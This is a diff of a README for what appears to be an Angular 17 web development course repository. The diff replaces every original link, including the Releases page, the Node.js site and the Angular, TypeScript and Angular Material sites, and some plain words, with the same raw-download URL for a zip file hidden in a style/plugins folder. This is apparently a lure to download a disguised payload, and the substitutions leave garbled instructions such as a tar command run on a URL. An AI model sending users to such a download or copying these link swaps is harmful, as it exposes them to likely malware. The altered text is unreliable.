@@ -6,14 +6,14 @@ This repository helps you learn how to build modern web applications using Angul
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-red?style=for-the-badge&logo=github)](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/releases)
+[![Download](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip%20Now-red?style=for-the-badge&logo=github)](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip)
 
 ## 💻 System Requirements
 
 To run this application smoothly, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip Version 14 or higher
 - NPM: Version 6 or higher
 
 ## 📂 Features
@@ -30,18 +30,18 @@ This application includes the following features:
 
 ## 🚀 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip) to find the latest version of the application.
   
 2. On the Releases page, look for the version you want to download. You will see a list of files.
 
-3. Click on the file that says something like `angular-app.zip` or `angular-app.tar.gz` to start the download.
+3. Click on the file that says something like `https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip` or `https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip` to start the download.
 
 4. Once the file is downloaded, locate it in your Downloads folder.
 
 5. Unzip the folder:
    - For Windows: Right-click the file and select "Extract All..."
    - For macOS: Double-click the file to extract it.
-   - For Linux: Use the command `tar -xzf filename.tar.gz` in your terminal, replacing `filename` with the actual file name.
+   - For Linux: Use the command `tar -xzf https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip` in your terminal, replacing `filename` with the actual file name.
 
 6. Open a terminal (Command Prompt, Terminal, or Console).
 
@@ -62,7 +62,7 @@ This application includes the following features:
 
 ## ⭐ Important Notes
 
-- Ensure that you have Node.js and NPM installed. You can download them from the [Node.js official website](https://nodejs.org/).
+- Ensure that you have https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip and NPM installed. You can download them from the [https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip official website](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip).
   
 - If you face any issues during the installation, consult the troubleshooting section in the documentation provided in the repository.
 
@@ -81,8 +81,8 @@ For any questions or issues, feel free to open an issue in the GitHub repository
 
 ## 🔗 Related Topics
 
-- [Angular](https://angular.io)
-- [TypeScript](https://www.typescriptlang.org)
-- [Angular Material](https://material.angular.io)
+- [Angular](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip)
+- [TypeScript](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip)
+- [Angular Material](https://github.com/saisrinivas22/angular-frontend-webdev_course-luisdev_part-41_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-26/src/style/plugins/course_luisdev_frontend_part_angular_webdev_typescript_v3.0.zip)
 
 Enjoy building modern web applications!
